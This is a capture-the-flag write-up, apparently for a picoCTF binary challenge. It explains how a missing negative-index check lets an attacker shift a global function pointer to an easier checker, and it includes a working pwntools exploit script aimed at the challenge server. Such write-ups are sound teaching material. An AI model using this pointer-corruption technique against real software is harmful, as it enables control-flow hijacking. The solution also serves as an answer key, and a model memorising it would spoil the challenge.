

The challenge provides a 32-bit, non-PIE Linux executable. The objective is to retrieve a flag by exploiting a vulnerability in the provided C source code.

The program prompts the user for two inputs: a string (`story`) and two integers (`num1`, `num2`). It then calls a function pointer, `check`, which is initialized to point to the `hard_checker` function. The `hard_checker` function requires the sum of the input string's ASCII character values to be `13371337`, a condition that is computationally impossible given the buffer's size limit of 127 characters.

The `easy_checker` function, however, requires a sum of only `1337`, which is achievable. The goal is therefore to redirect the `check` function pointer from `hard_checker` to `easy_checker`.

-----


The vulnerability lies in the `vuln` function:

```c
void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```

The code checks if `num1` is less than 10 to prevent an upper out-of-bounds write on the global array `int fun[10]`. However, it fails to check for negative values. The `scanf` function with the `%d` format specifier permits negative integers. By supplying a negative value for `num1`, an attacker can write to memory locations preceding the `fun` array. This is a classic **integer underflow** leading to an out-of-bounds write.

The target of this write is the global function pointer `void (*check)(char*, size_t)`, which is defined directly before the `fun` array in the source code.

-----



The exploit is executed in two stages: redirecting the function pointer and satisfying the new condition.

#### 3.1. Control Flow Hijacking

The first step is to calculate the precise offsets needed to modify the `check` pointer. This requires analysis of the specific binary provided for the challenge instance.

1.  **Function Address Delta:** The operation is an addition (`+=`), not a direct overwrite. To change the pointer's value from the address of `hard_checker` to that of `easy_checker`, we must add the difference between their addresses.

      * Address of `easy_checker`: `0x80492fc`
      * Address of `hard_checker`: `0x8049436`
      * **Value (`num2`)**: \`$0x80492fc - 0x8049436 = -570$

2.  **Memory Layout and Index Offset:** It cannot be assumed that the `check` pointer and `fun` array are adjacent in memory. Compilers may introduce padding. By examining the binary's symbol table, the exact addresses are found:

      * Address of `check` pointer: `0x804c040`
      * Address of `fun` array: `0x804c080`
      * **Memory Gap**: \`$0x804c080 - 0x804c040 = 0x40$ (64 bytes)
      * Since `fun` is an array of 4-byte integers, the index (`num1`) required to reach the `check` pointer is calculated as: `-(64 / 4) = -16`.

The payload to overwrite the pointer is therefore `num1 = -16` and `num2 = -570`.



The second step is to provide a string to `story` whose character values sum to `1337`. The string `"ZZZZZZZZZZZZZZM"` satisfies this condition:

  * ASCII('Z') = 90
  * ASCII('M') = 77
  * **Total Score**: $(14 \\times 90) + 77 = 1260 + 77 = 1337$.

-----



The following Python script automates the exploitation process by sending the calculated payloads to the remote server.

```python
#!/usr/bin/env python3
from pwn import *

# --- Configuration ---
HOST = "saturn.picoctf.net"
PORT = 60188 # Note: Port may vary per instance

# --- Calculated Offsets ---
# Value to add to the function pointer
address_delta = -570
# Index to reach the function pointer's memory location
index_offset = -16

# --- Execution ---
try:
    # Connect to the remote target
    io = connect(HOST, PORT)

    # 1. Send the story payload to satisfy the easy_checker condition
    story_payload = b"Z" * 14 + b"M"
    io.sendlineafter(b'>> ', story_payload)

    # 2. Send the numeric payload to overwrite the function pointer
    numeric_payload = f"{index_offset} {address_delta}".encode()
    io.sendlineafter(b'Keep the first one less than 10.\n', numeric_payload)

    # 3. Receive and parse the flag
    io.recvuntil(b'picoCTF{')
    flag_content = io.recvuntil(b'}', drop=True).decode()
    flag = f"picoCTF{{{flag_content}}}"
    log.success(f"Flag: {flag}")

except Exception as e:
    log.failure(f"Exploit failed: {e}")
finally:
    if 'io' in locals() and io:
        io.close()
```
